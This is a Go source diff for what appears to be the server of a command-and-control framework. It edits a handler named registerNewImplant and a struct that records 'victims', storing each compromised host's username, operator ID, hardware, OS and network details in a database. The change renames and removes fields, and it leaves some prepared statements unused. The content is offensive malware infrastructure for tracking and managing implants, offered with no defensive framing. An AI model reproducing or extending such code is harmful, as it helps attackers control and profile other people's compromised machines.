@@ -63,14 +63,13 @@ func getClients(w http.ResponseWriter, r *http.Request) {
 
 // Much like List Devices struct, we define one more complete to register victims
 type Device struct {
-	Name            string `json:"Name"`
 	ID              string `json:"ID"`
+	DeviceName      string `json:"DeviceName"`
 	Username        string `json:"Username"`
 	OperatorID      int    `json:"OperatorID"`
 	CPUArchitecture string `json:"CPUArchitecture"`
-	CPUInfo         string `json:"CPUInfo"`
+	GPUInfo         string `json:"GPUInfo"`
 	RAMInfo         int    `json:"RAMInfo"`
-	Storage         int    `json:"Storage"`
 	OSName          string `json:"OSName"`
 	NetworkInfo     string `json:"NetworkInfo"`
 	CurrentDate     string `json:"CurrentDate"`
@@ -88,6 +87,8 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		return
 	}
+
+	fmt.Printf("Registering a new implant %s\n\n", device.DeviceName)
 
 	// After the data is ready, we set a list of prepared statements in order to insert the data from the JSON request into the database
 	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id) VALUES (?, ?)")
@@ -135,13 +136,6 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 	}
 	defer stmt.Close()
 
-	_, err = stmt.Exec(device.CPUInfo, victimID)
-	if err != nil {
-		log.Println(err.Error())
-		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
-		return
-	}
-
 	stmt, err = db.Prepare("INSERT INTO RAM (amount, victim_id) VALUES (?, ?)")
 	if err != nil {
 		log.Println(err.Error())
@@ -164,13 +158,6 @@ func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	defer stmt.Close()
-
-	_, err = stmt.Exec(device.Storage, victimID)
-	if err != nil {
-		log.Println(err.Error())
-		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
-		return
-	}
 
 	stmt, err = db.Prepare("INSERT INTO Operating_System (name, victim_id) VALUES (?, ?)")
 	if err != nil {
